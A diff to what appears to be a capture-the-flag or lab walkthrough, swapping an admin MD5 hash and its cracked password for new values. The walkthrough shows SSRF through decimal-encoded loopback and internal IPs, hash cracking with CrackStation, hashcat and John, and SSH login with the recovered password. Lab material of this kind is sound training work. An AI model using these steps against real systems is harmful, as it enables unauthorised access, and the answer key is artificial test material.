@@ -240,7 +240,7 @@ Enter: `http://167772175:5000/api/admin_keys` (or `http://2130706433:5000/api/ad
 ```json
 {
   "user": "admin",
-  "md5_hash": "a1cf52359c3310d04619c8925b8c53c8",
+  "md5_hash": "5fcfd41e547a12215b173ff47fdd3739",
   "flag_location": "manifest.enc (Requires vault.key to decrypt)",
   "vault_key_path": "/opt/vanguard/data/vault.key"
 }
@@ -259,23 +259,23 @@ Enter: `http://167772175:5000/api/manifest_info` (or `http://2130706433:5000/api
 
 **Option A: Online (fast)**
 Go to https://crackstation.net
-Paste: `a1cf52359c3310d04619c8925b8c53c8`
-Result: `admin_core_77`
+Paste: `5fcfd41e547a12215b173ff47fdd3739`
+Result: `trustno1`
 
 **Option B: Using hashcat (offline)**
 ```bash
-echo "a1cf52359c3310d04619c8925b8c53c8" > hash.txt
+echo "5fcfd41e547a12215b173ff47fdd3739" > hash.txt
 hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
 **Option C: Using John the Ripper**
 ```bash
-echo "a1cf52359c3310d04619c8925b8c53c8" > hash.txt
+echo "5fcfd41e547a12215b173ff47fdd3739" > hash.txt
 john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 john --show hash.txt
 ```
 
-**Result:** Password is `admin_core_77`
+**Result:** Password is `trustno1`
 
 ### 5.2 SSH into the Database Server
 From Phase 1, you know SSH is on port 58229.
@@ -286,7 +286,7 @@ Good pentesters always verify claims — try it anyway.
 ssh -p 58229 admin@<TARGET_IP>
 ```
 
-When prompted, enter password: `admin_core_77`
+When prompted, enter password: `trustno1`
 
 **It works!** The SSH server was misconfigured — PasswordAuthentication is set to `yes`
 despite the Phase 1 documentation claiming it was disabled. This is the intentional
